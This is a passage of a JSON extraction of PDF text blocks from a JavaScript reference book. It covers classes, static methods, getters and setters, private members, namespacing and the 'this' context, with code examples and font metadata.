        "text": "const  foo  =   new  MyClass ( 'speedy' );   // logs: \"Creating instance using speedy option\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A small thing to note is that a class constructor cannot be made static via the  static  keyword, as described below for other methods.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.2: Class Inheritance",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Inheritance works just like it does in other object-oriented languages: methods de\ufb01ned on the superclass are accessible in the extending subclass. If the subclass declares its own constructor then it must invoke the parents constructor via  super ()  before it can access  this .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  SuperClass  {     constructor ()   {          this . logger   =  console. log ;      }     log ()   {          this . logger ( `Hello $ { this . name } ` );      } } class  SubClass  extends  SuperClass  {     constructor ()   {          super ();          this . name   =   'subclass' ;      } } const  subClass  =   new  SubClass ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "subClass. log ();   // logs: \"Hello subclass\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 193",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.3: Static Methods",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Static methods and properties are de\ufb01ned on  the class/constructor itself , not on instance objects. These are speci\ufb01ed in a class de\ufb01nition by using the  static  keyword.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  MyClass  {      static  myStaticMethod ()   {          return   'Hello' ;      }      static   get  myStaticProperty ()   {          return   'Goodbye' ;      } } console. log ( MyClass. myStaticMethod ());   // logs: \"Hello\" console. log ( MyClass. myStaticProperty );   // logs: \"Goodbye\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can see that static properties are not de\ufb01ned on object instances:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  myClassInstance  =   new  MyClass (); console. log ( myClassInstance. myStaticProperty );   // logs: undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, they  are  de\ufb01ned on subclasses:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  MySubClass  extends  MyClass  {}; console. log ( MySubClass. myStaticMethod ());   // logs: \"Hello\" console. log ( MySubClass. myStaticProperty );   // logs: \"Goodbye\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 22.4: Getters and Setters",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Getters and setters allow you to de\ufb01ne custom behaviour for reading and writing a given property on your class. To the user, they appear the same as any typical property. However, internally a custom function you provide is used to determine the value when the property is accessed (the getter), and to perform any necessary changes when the property is assigned (the setter). In a  class  de\ufb01nition, a getter is written like a no-argument method pre\ufb01xed by the  get  keyword. A setter is similar, except that it accepts one argument (the new value being assigned) and the  set  keyword is used instead. Here's an example class which provides a getter and setter for its  . name  property. Each time it's assigned, we'll record the new name in an internal  . names_  array. Each time it's accessed, we'll return the latest name.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  MyClass  {     constructor ()   {          this . names_   =   [];      }      set  name ( value )   {          this . names_ . push ( value );      }      get  name ()   {          return   this . names_ [ this . names_ . length   -   1 ];      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 194",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  myClassInstance  =   new  MyClass (); myClassInstance. name   =   'Joe' ; myClassInstance. name   =   'Bob' ; console. log ( myClassInstance. name );   // logs: \"Bob\" console. log ( myClassInstance. names_ );   // logs: [\"Joe\", \"Bob\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you only de\ufb01ne a setter, attempting to access the property will always return  undefined .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  classInstance  =   new   class   {      set  prop ( value )   {         console. log ( 'setting' ,  value );      } }; classInstance. prop   =   10 ;   // logs: \"setting\", 10 console. log ( classInstance. prop );   // logs: undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you only de\ufb01ne a getter, attempting to assign the property will have no e\ufb00ect.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  classInstance  =   new   class   {      get  prop ()   {          return   5 ;      } }; classInstance. prop   =   10 ; console. log ( classInstance. prop );   // logs: 5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 22.5: Private Members",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript does not technically support private members as a language feature. Privacy -  described by Douglas Crockford  - gets emulated instead via closures (preserved function scope) that will be generated each with every instantiation call of a constructor function. The  Queue  example demonstrates how, with constructor functions, local state can be preserved and made accessible too via privileged methods.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  Queue  {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  constructor  ()   {                      // - does generate a closure with each instantiation.      const  list  =   [];                    // - local state (\"private member\").      this . enqueue   =   function   ( type )   {    // - privileged public method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                                       //   accessing the local state       list. push ( type );                  //   \"writing\" alike.        return  type ;      };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . dequeue   =   function   ()   {        // - privileged public method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                                       //   accessing the local state        return  list. shift ();              //   \"reading / writing\" alike.      };    } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 195",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  q  =   new  Queue ;              //                                // q. enqueue ( 9 );                   // ... first in ... q. enqueue ( 8 );                   // q. enqueue ( 7 );                   //                                // console. log ( q. dequeue ());       // 9 ... first out. console. log ( q. dequeue ());       // 8 console. log ( q. dequeue ());       // 7 console. log ( q );                 // {} console. log ( Object. keys ( q ));    // [\"enqueue\",\"dequeue\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With every instantiation of a  Queue  type the constructor generates a closure. Thus both of a  Queue  type's own methods  enqueue  and  dequeue  (see  Object. keys ( q ) ) still do have access to  list that continues to  live  in its enclosing scope that, at construction time, has been preserved. Making use of this pattern - emulating private members via privileged public methods - one should keep in mind that, with every instance, additional memory will be consumed for every  own property  method (for it is code that can't be shared/reused). The same is true for the amount/size of state that is going to be stored within such a closure.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.6: Methods",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Methods can be de\ufb01ned in classes to perform a function and optionally return a result. They can receive arguments from the caller.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  Something  {     constructor ( data )   {          this . data   =  data      }     doSomething ( text )   {          return   {             data :   this . data ,             text          }      } } var  s  =   new  Something ({})",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "s. doSomething ( \"hi\" )   // returns: { data: {}, text: \"hi\" }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 22.7: Dynamic Method Names",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There is also the ability to evaluate expressions when naming methods similar to how you can access an objects' properties with  [] . This can be useful for having dynamic property names, however is often used in conjunction with Symbols.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  METADATA  =  Symbol ( 'metadata' ); class  Car  {   constructor ( make ,  model )   {      this . make   =  make ;      this . model   =  model ;    }  ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // example using symbols",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 196",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   [ METADATA ]()   {      return   {       make :   this . make ,       model :   this . model      };    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // you can also use any javascript expression    // this one is just a string, and could also be defined with simply add()",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   [ \"add\" ]( a ,  b )   {      return  a  +  b ;    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // this one is dynamically evaluated",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   [ 1   +   2 ]()   {      return   \"three\" ;    } } let  MazdaMPV  =   new  Car ( \"Mazda\" ,   \"MPV\" ); MazdaMPV. add ( 4 ,   5 );   // 9 MazdaMPV [ 3 ]();   // \"three\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "MazdaMPV [ METADATA ]();   // { make: \"Mazda\", model: \"MPV\" }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 22.8: Managing Private Data with Classes",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "One of the most common obstacles using classes is \ufb01nding the proper approach to handle private states. There are 4 common solutions for handling private states:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using Symbols",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Symbols are new primitive type introduced on in ES2015, as de\ufb01ned at  MDN A symbol is a unique and immutable data type that may be used as an identi\ufb01er for object properties. When using symbol as a property key, it is not enumerable. As such, they won't be revealed using  for   var   in  or  Object. keys . Thus we can use symbols to store private data. const  topSecret  =  Symbol ( 'topSecret' );   // our private key; will only be accessible on the scope of the module file export   class  SecretAgent {     constructor ( secret ){          this [ topSecret ]   =  secret ;   // we have access to the symbol key (closure)          this . coverStory   =   'just a simple gardner' ;          this . doMission   =   ()   =>   {             figureWhatToDo ( topSecret [ topSecret ]);   // we have access to topSecret",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [],
        "comment": "Private Data"
    },
    {
        "text": "         };      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Because  symbols  are unique, we must have reference to the original symbol to access the private property.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { SecretAgent }  from  'SecretAgent.js'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 197",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  agent  =   new  SecretAgent ( 'steal all the ice cream' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// ok let's try to get the secret out of him! Object. keys ( agent );   // ['coverStory'] only cover story is public, our secret is kept. agent [ Symbol ( 'topSecret' )];   // undefined, as we said, symbols are always unique, so only the original symbol will help us to get the data.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But it's not 100% private; let's break that agent down! We can use the  Object. getOwnPropertySymbols  method to get the object symbols.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  secretKeys  =  Object. getOwnPropertySymbols ( agent );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "agent [ secretKeys [ 0 ]]   // 'steal all the ice cream' , we got the secret.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Using WeakMaps",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "WeakMap  is a new type of object that have been added for es6. As de\ufb01ned on  MDN The WeakMap object is a collection of key/value pairs in which the keys are weakly referenced. The keys must be objects and the values can be arbitrary values. Another important feature of  WeakMap  is, as de\ufb01ned on  MDN . The key in a WeakMap is held weakly. What this means is that, if there are no other strong references to the key, the entire entry will be removed from the WeakMap by the garbage collector. The idea is to use the WeakMap, as a static map for the whole class, to hold each instance as key and keep the private data as a value for that instance key. Thus only inside the class will we have access to the  WeakMap  collection. Let's give our agent a try, with  WeakMap :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  topSecret  =   new  WeakMap ();   // will hold all private data of all instances.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export   class  SecretAgent {     constructor ( secret ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        topSecret. set ( this , secret );   // we use this, as the key, to set it on our instance private data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         this . coverStory   =   'just a simple gardner' ;          this . doMission   =   ()   =>   {             figureWhatToDo ( topSecret. get ( this ));   // we have access to topSecret          };      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Because the const  topSecret  is de\ufb01ned inside our module closure, and since we didn't bind it to our instance properties, this approach is totally private, and we can't reach the agent  topSecret .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "De\ufb01ne all methods inside the constructor",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The idea here is simply to de\ufb01ne all our methods and members inside the constructor and use the closure to access private members without assigning them to  this .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    export   class  SecretAgent {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 198",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "        constructor ( secret ){              const  topSecret  =  secret ;              this . coverStory   =   'just a simple gardner' ;              this . doMission   =   ()   =>   {                 figureWhatToDo ( topSecret );   // we have access to topSecret              };          }      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example as well the data is 100% private and can't be reached outside the class, so our agent is safe.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using naming conventions",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "We will decide that any property who is private will be pre\ufb01xed with  _ . Note that for this approach the data isn't really private.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "export   class  SecretAgent {     constructor ( secret ){          this ._topSecret  =  secret ;   // it private by convention          this . coverStory   =   'just a simple gardner' ;          this . doMission   =   ()   =>   {             figureWhatToDo ( this_topSecret );          };      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 22.9: Class Name binding",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "ClassDeclaration's Name is bound in di\ufb00erent ways in di\ufb00erent scopes - The scope in which the class is de\ufb01ned -  let  binding 1. The scope of the class itself - within  {  and  }  in  class   {}  -  const  binding 2.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  Foo  {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Foo inside this block is a const binding } // Foo here is a let binding",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For example,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  A  {   foo ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    A  =   null ;   // will throw at runtime as A inside the class is a `const` binding    } } A  =   null ;   // will NOT throw as A here is a `let` binding",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is not the same for a Function -",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  A ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  A  =   null ;   // works } A. prototype . foo   =   function  foo ()   {   A  =   null ;   // works }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A  =   null ;   // works",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 199",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 23: Namespacing",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 23.1: Namespace by direct assignment",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "  //Before: antipattern 3 global variables",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  setActivePage  =   function   ()   {};      var  getPage  =   function ()   {};      var  redirectPage  =   function ()   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//After:  just 1 global variable, no function collision and more meaningful function names",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  NavigationNs  =  NavigationNs  ||   {};     NavigationNs. active   =   function ()   {}     NavigationNs. pagination   =   function ()   {}     NavigationNs. redirection   =   function ()   {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 23.2: Nested Namespaces",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When multiple modules are involved, avoid proliferating global names by creating a single global namespace. From there, any sub-modules can be added to the global namespace. (Further nesting will slow down performance and add unnecessary complexity.) Longer names can be used if name clashes are an issue:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  var  NavigationNs  =  NavigationNs  ||   {};      NavigationNs. active   =    {};      NavigationNs. pagination   =   {};      NavigationNs. redirection   =   {};    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      // The second level start here.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     Navigational. pagination . jquery   =   function ();      Navigational. pagination . angular   =   function ();      Navigational. pagination . ember   =   function ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 200",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 24: Context (this)",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 24.1: this with simple objects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  person  =   {   name :   'John Doe' ,   age :   42 ,   gender :   'male' ,   bio :   function ()   {     console. log ( 'My name is '   +   this . name );    } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "person. bio ();   // logs \"My name is John Doe\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  bio  =  person. bio ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "bio ();   // logs \"My name is undefined\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the above code,  person. bio  makes use of the  context  ( this ). When the function is called as  person. bio () , the context gets passed automatically, and so it correctly logs \"My name is John Doe\". When assigning the function to a variable though, it loses its context. In non-strict mode, the default context is the global object ( window ). In strict mode it is  undefined .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 24.2: Saving this for use in nested functions / objects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "One common pitfall is to try and use  this  in a nested function or an object, where the context has been lost.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. getElementById ( 'myAJAXButton' ) . onclick   =   function (){     makeAJAXRequest ( function ( result ){        if   ( result )   {   // success          this . className   =   'success' ;        }      }) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here the context ( this ) is lost in the inner callback function. To correct this, you can save the value of  this  in a variable:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. getElementById ( 'myAJAXButton' ) . onclick   =   function (){      var  self  =   this ;     makeAJAXRequest ( function ( result ){        if   ( result )   {   // success         self. className   =   'success' ;        }      }) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "ES6 introduced arrow functions which include lexical  this  binding. The above example could be written like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. getElementById ( 'myAJAXButton' ) . onclick   =   function (){     makeAJAXRequest ( result  =>   {        if   ( result )   {   // success          this . className   =   'success' ;        }      }) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 201",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 24.3: Binding function context",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Every function has a  bind  method, which will create a wrapped function that will call it with the correct context. See here for more information.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  monitor  =   {   threshold :   5 ,   check :   function ( value )   {      if   ( value  >   this . threshold )   {        this . display ( \"Value is too high!\" );      }    },   display ( message )   {     alert ( message );    } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "monitor. check ( 7 );   // The value of `this` is implied by the method call syntax.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  badCheck  =  monitor. check ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "badCheck ( 15 );   // The value of `this` is window object and this.threshold is undefined, so value > this.threshold is false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  check  =  monitor. check . bind ( monitor );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "check ( 15 );   // This value of `this` was explicitly bound, the function works.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  check8  =  monitor. check . bind ( monitor ,   8 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "check8 ();   // We also bound the argument to `8` here. It can't be re-specified.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Hard binding",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The object of  hard binding  is to \"hard\" link a reference to  this . Advantage: It's useful when you want to protect particular objects from being lost. Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Person (){     console. log ( \"I'm \"   +   this . name ); } var  person0  =   { name :   \"Stackoverflow\" } var  person1  =   { name :   \"John\" }; var  person2  =   { name :   \"Doe\" }; var  person3  =   { name :   \"Ala Eddine JEBALI\" }; var  origin  =  Person ; Person  =   function (){     origin. call ( person0 ); } Person ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//outputs: I'm Stackoverflow",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Person. call ( person1 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//outputs: I'm Stackoverflow",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Person. apply ( person2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 202",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//outputs: I'm Stackoverflow",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Person. call ( person3 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//outputs: I'm Stackoverflow",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "So, as you can remark in the example above, whatever object you pass to  Person , it'll always use  person0",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "object :  it's hard binded .",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 24.4: this in constructor functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When using a function as a constructor, it has a special  this  binding, which refers to the newly created object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Cat ( name )   {    this . name   =  name ;    this . sound   =   \"Meow\" ; } var  cat  =   new  Cat ( \"Tom\" );   // is a Cat object",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "cat. sound ;   // Returns \"Meow\" var  cat2  =  Cat ( \"Tom\" );   // is undefined -- function got executed in global context",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "window. name ;   // \"Tom\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "cat2. name ;   // error! cannot access property of undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 203",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 25: Setters and Getters",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Setters and getters are object properties that call a function when they are set/gotten.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 25.1: De\ufb01ning a Setter/Getter Using Object.de\ufb01neProperty",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  setValue ; var  obj  =   {}; Object. defineProperty ( obj ,   \"objProperty\" ,   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     get :   function (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   \"a value\" ;      },      set :   function ( value ){         setValue  =  value ;      } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 25.2: De\ufb01ning an Setter/Getter in a Newly Created Object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript allows us to de\ufb01ne getters and setters in the object literal syntax. Here's an example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date  =   {     year :   '2017' ,     month :   '02' ,     day :   '27' ,      get  date ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Get the date in YYYY-MM-DD format",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return  `$ { this . year }- $ { this . month }- $ { this . day } `      },      set  date ( dateString )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Set the date from a YYYY-MM-DD formatted string          var  dateRegExp  =   /(\\d{4})-(\\d{2})-(\\d{2})/ ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Check that the string is correctly formatted",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         if   ( dateRegExp. test ( dateString ))   {              var  parsedDate  =  dateRegExp. exec ( dateString );              this . year   =  parsedDate [ 1 ];              this . month   =  parsedDate [ 2 ];              this . day   =  parsedDate [ 3 ];          }          else   {              throw   new  Error ( 'Date string must be in YYYY-MM-DD format' );          }      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
